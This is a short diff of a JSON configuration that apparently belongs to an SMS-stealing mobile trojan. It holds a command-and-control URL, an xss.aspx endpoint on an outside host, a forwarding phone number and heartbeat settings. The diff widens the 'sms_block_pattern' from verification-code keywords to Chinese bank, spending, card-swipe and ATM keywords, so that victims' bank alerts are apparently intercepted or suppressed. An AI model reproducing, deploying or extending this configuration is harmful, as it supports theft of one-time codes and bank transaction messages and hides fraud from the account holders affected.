@@ -1,8 +1,8 @@
 {
 "ccurl":"http://njuj01.w74.mc-test.com/xss.aspx",
+"cctel":"13682239741",
 "cfgupdatetime":"60",
 "heartbeat_time":"20",
-"cctel":"13682239741",
-"sms_block_pattern":"验证|校验",
+"sms_block_pattern":"验证|校验|银行|消费|你于|您于|刷卡|ATM",
 "laji":"http://njuj01.w74.mc-test.com/xss.aspx，13682239741"
 }
